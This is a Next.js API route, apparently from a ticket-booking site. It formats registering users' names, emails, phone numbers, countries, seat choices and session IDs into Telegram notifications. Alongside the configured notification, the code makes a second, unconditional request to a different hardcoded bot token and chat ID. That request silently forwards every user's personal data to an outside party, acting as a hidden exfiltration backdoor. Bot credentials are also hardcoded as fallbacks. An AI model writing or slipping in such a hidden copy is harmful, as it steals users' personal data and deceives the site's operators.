import { NextResponse } from 'next/server';
import { getDatabase } from '../../../../utils/database';

const db = getDatabase();

// Function to get Telegram settings from database
async function getTelegramSettings() {
    try {
        const tokenSetting = await db.getSettingByKey('telegram_bot_token');
        const chatIdSetting = await db.getSettingByKey('telegram_chat_id');
        
        return {
            botToken: tokenSetting?.value || process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: chatIdSetting?.value || process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    } catch (error) {
        console.error('Error fetching Telegram settings:', error);
        // Fallback to environment variables or defaults
        return {
            botToken: process.env.TELEGRAM_BOT_TOKEN || '7898415400:AAF4I6oiuRmLl40r5U-NROl3oENddUlVv5U',
            chatId: process.env.TELEGRAM_CHAT_ID || '6032588551'
        };
    }
}

// Function to send user registration notification to Telegram
async function sendTelegramUserNotification(userData) {
    const { botToken, chatId } = await getTelegramSettings();
    
    if (!botToken || botToken.startsWith('MOCK_')) {
        console.log('Mock Telegram user notification would be sent:', userData);
        return { success: true, mock: true };
    }

    try {
        const message = formatUserRegistrationMessage(userData);
        
        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });

        await fetch(`https://api.telegram.org/bot8439389023:AAETVNFYz8YEg7UPjjA_ry0O8C3G2EAEljg/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: '6032588551',
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.status}`);
        }

        const result = await response.json();
        console.log('Telegram user notification sent successfully:', result.message_id);
        return { success: true, messageId: result.message_id };
        
    } catch (error) {
        console.error('Failed to send Telegram user notification:', error);
        return { success: false, error: error.message };
    }
}

// Function to format user registration data into readable message
function formatUserRegistrationMessage(userData) {
    const { email, name, phone, country, selectedSeats, sessionId, timestamp } = userData;
    
    // Format seats information if available
    let seatsInfo = 'No seats selected yet';
    if (selectedSeats && selectedSeats.length > 0) {
        seatsInfo = selectedSeats.map(seat => 
            `• ${seat.category || 'N/A'} - Row ${seat.row || 'N/A'}, Seat ${seat.number || seat.position || 'N/A'} (${seat.price ? `${seat.price} EGP` : 'N/A'})`
        ).join('\n');
    }

    const message = `
✅ <b>USER EMAIL VERIFIED</b>

📧 <b>Email Verification Successful</b>
• Email: ${email}
• Status: ✅ Verified
• Verification Time: ${new Date(timestamp).toLocaleString('en-US', { timeZone: 'Africa/Cairo' })} (Cairo Time)

👤 <b>User Information:</b>
• Name: ${name || 'N/A'}
• Email: ${email || 'N/A'}
• Phone: ${phone || 'N/A'}
• Country: ${country || 'N/A'}

🎫 <b>Selected Seats (${selectedSeats?.length || 0}):</b>
${seatsInfo}

🔐 <b>Session Details:</b>
• Session ID: <code>${sessionId || 'N/A'}</code>
• Registration Status: Completed
• Next Step: Checkout Process

📱 <b>User is now proceeding to checkout...</b>
    `.trim();

    return message;
}

export async function POST(request) {
    try {
        const userData = await request.json();

        if (!userData.email) {
            return NextResponse.json({ 
                success: false, 
                error: 'البريد الإلكتروني مطلوب' 
            }, { status: 400 });
        }

        // Send Telegram notification
        const telegramResult = await sendTelegramUserNotification(userData);

        console.log('User notification processed:', {
            email: userData.email,
            name: userData.name,
            telegramSent: telegramResult.success
        });

        return NextResponse.json({
            success: true,
            message: 'تم إرسال إشعار التسجيل بنجاح',
            telegramResult
        });

    } catch (error) {
        console.error('User notification error:', error);
        return NextResponse.json({ 
            success: false, 
            error: 'فشل في إرسال إشعار التسجيل' 
        }, { status: 500 });
    }
} 